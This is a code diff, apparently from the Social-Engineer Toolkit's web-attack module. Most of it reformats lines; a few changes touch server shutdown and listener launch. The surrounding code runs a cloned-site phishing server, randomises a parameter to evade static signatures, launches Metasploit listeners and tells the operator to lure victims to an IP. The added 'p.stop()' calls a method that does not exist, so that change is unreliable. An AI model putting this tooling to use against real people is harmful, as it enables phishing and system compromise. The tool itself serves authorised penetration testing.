@@ -35,8 +35,7 @@ if check_options("CUSTOM_EXE="):
 
         # we randomize param name so static sigs cant be used
         goat_random = generate_random_string(4, 4)
-        data = data.replace('param name="8" value="YES"',
-                        'param name="8" value="%s"' % (goat_random))
+        data = data.replace('param name="8" value="YES"', 'param name="8" value="%s"' % (goat_random))
         filewrite.write(data)
         filewrite.close()
         subprocess.Popen("mv %s/web_clone/index.html.new %s/web_clone/index.html" % (userconfigpath, userconfigpath), shell=True).wait()
@@ -78,8 +77,6 @@ if os.path.isfile(userconfigpath + "set.payload"):
 # Start of the SET Web Server for multiattack, java applet, etc.
 #
 ##########################################################################
-
-
 def web_server_start():
     # define if use apache or not
     apache = 0
@@ -291,13 +288,15 @@ def web_server_start():
                 path = (userconfigpath + "web_clone/")
                 try:
                     import multiprocessing
-                    p = multiprocessing.Process(
-                        target=webserver.start_server, args=(web_port, path))
+                    p = multiprocessing.Process(target=webserver.start_server, args=(web_port, path))
                     p.start()
-                except Exception:
+
+                except KeyboardInterrupt:
+                    p.stop()
+
+                except Exception as e:
                     import thread
-                    thread.start_new_thread(
-                        webserver.start_server, (web_port, path))
+                    thread.start_new_thread(webserver.start_server, (web_port, path))
 
             # Handle KeyboardInterrupt
             except KeyboardInterrupt:
@@ -321,8 +320,7 @@ def web_server_start():
                         # specify the path for the SET web directories for the
                         # applet attack
                         path = (userconfigpath + "web_clone/")
-                        p = multiprocessing.Process(
-                            target=webserver.start_server, args=(web_port, path))
+                        p = multiprocessing.Process(target=webserver.start_server, args=(web_port, path))
                         p.start()
 
                     except Exception:
@@ -338,14 +336,15 @@ def web_server_start():
                         # try block inside of loop, if control-c detected, then
                         # exit
                         try:
-                            print_warning(
-                                "Note that if you are using a CUSTOM payload. YOU NEED TO CREATE A LISTENER!!!!!")
+                            print_warning("Note that if you are using a CUSTOM payload. YOU NEED TO CREATE A LISTENER!!!!!")
                             pause = input(
                                 bcolors.GREEN + "\n[*] Web Server is listening. Press Control-C to exit." + bcolors.ENDC)
 
                         # handle keyboard interrupt
                         except KeyboardInterrupt:
                             print(bcolors.GREEN + "[*] Returning to main menu." + bcolors.ENDC)
+                            try: p.stop()
+                            except: pass
                             break
 
     if apache == 1:
@@ -541,10 +540,8 @@ try:
                 match2 = re.search("set SRVPORT 8080", line)
                 if not match2:
                     if apache == 1:
-                        print_warning(
-                            "Apache appears to be configured in the SET (set_config)")
-                        print_warning(
-                            "You will need to disable Apache and re-run SET since Metasploit requires port 80 for WebDav")
+                        print_warning("Apache appears to be configured in the SET (set_config)")
+                        print_warning("You will need to disable Apache and re-run SET since Metasploit requires port 80 for WebDav")
                         exit_set()
                     print(bcolors.RED + """Since the exploit picked requires port 80 for WebDav, the\nSET HTTP Server port has been changed to 8080. You will need\nto coax someone to your IP Address on 8080, for example\nyou need it to be http://172.16.32.50:8080 instead of standard\nhttp (80) traffic.""")
 
@@ -562,6 +559,7 @@ try:
 
     # if metasploit config is in directory
     if os.path.isfile(userconfigpath + "meta_config"):
+      if ("CUSTOM" not in template) and ("SELF" not in template):
         print_info("Launching MSF Listener...")
         print_info("This may take a few to load MSF...")
         # this checks to see if we want to start a listener
@@ -577,8 +575,7 @@ try:
                 meta_config = "meta_config_multipyinjector"
             # if we arent using a custom payload
             if custom != 1:
-                child1 = pexpect.spawn(
-                    "%smsfconsole -r %s/%s\r\n\r\n" % (msf_path, userconfigpath, meta_config))
+                child1 = pexpect.spawn("%smsfconsole -r %s/%s\r\n\r\n" % (msf_path, userconfigpath, meta_config))
             # check if we want to deliver emails or track users that click the
             # link
             webattack_email = check_config("WEBATTACK_EMAIL=").lower()
